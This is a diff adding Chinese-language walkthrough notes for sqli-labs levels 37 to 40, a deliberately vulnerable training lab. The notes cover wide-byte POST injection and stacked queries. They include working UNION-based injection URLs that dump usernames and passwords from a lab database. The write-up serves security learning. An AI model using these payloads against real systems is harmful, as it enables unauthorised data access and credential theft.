@@ -1189,6 +1189,125 @@ uname=admin%ee' union select 1,group_concat(column_name) from information_schema
 
 
 
+重点在这里，但是这个函数对我们来说没有啥用
+
+函数说明
+
+https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp
+
+## 37.POST型宽字节注入
+
+
+抓包改admin，和36一样，只不过是换了一个注入的位置
+
+![image](https://user-images.githubusercontent.com/76896357/115109267-49b6be80-9fa7-11eb-9f07-a47856244c37.png)
+
+过了
+
+## 38. Future Edition(堆叠查询)
+
+![image](https://user-images.githubusercontent.com/76896357/115109345-e9744c80-9fa7-11eb-8468-47133eba7b7b.png)
+
+**看了一下，可以让我们进行堆叠查询**
+
+**mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。（有这个才能进行堆叠）
+分号我们可以加入注入的新的语句**
+
+![image](https://user-images.githubusercontent.com/76896357/115109418-30fad880-9fa8-11eb-8d92-320c323b7382.png)
+
+还是很容易就可以查到的
+
+![image](https://user-images.githubusercontent.com/76896357/115109447-5982d280-9fa8-11eb-9f6a-b520f94179ea.png)
+
+最后可以让用户名和密码一起查询
+
+```
+http://192.168.220.12/sqli/Less-38/?id=-1'%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users%20--+
+```
+![image](https://user-images.githubusercontent.com/76896357/115109613-6fdd5e00-9fa9-11eb-8f9c-5ae13832cc86.png)
+
+
+## 39. STACK Query
+
+* 查看闭合方式
+
+![image](https://user-images.githubusercontent.com/76896357/115109519-c007f080-9fa8-11eb-8de3-58c68c6fb80f.png)
+
+* 很显然是数字型注入，没有闭合方式
+```
+http://192.168.220.12/sqli/Less-39/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users%20 --+//用户名和密码一起爆
+```
+直接显示所有数据
+
+![image](https://user-images.githubusercontent.com/76896357/115109585-40c6ec80-9fa9-11eb-8570-828bdb63e395.png)
+
+## 40. STACK QUERy 盲注
+但还是有回显
+```
+http://192.168.220.12/sqli/Less-40/?id=-1%27)%20union%20select%201,2,3%20--+//猜闭合方式就可以了
+```
+* 猜测闭合方式
+
+![image](https://user-images.githubusercontent.com/76896357/115109722-1164af80-9faa-11eb-855d-e1f811296b19.png)
+
+一通乱猜，啥也没有，
+
+就干脆认为是数字型注入，果然是
+
+![image](https://user-images.githubusercontent.com/76896357/115109835-c7c89480-9faa-11eb-8a59-f0d54a7d4699.png)
+
+剩下的就几乎一样了。。。
+
+过了。。。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
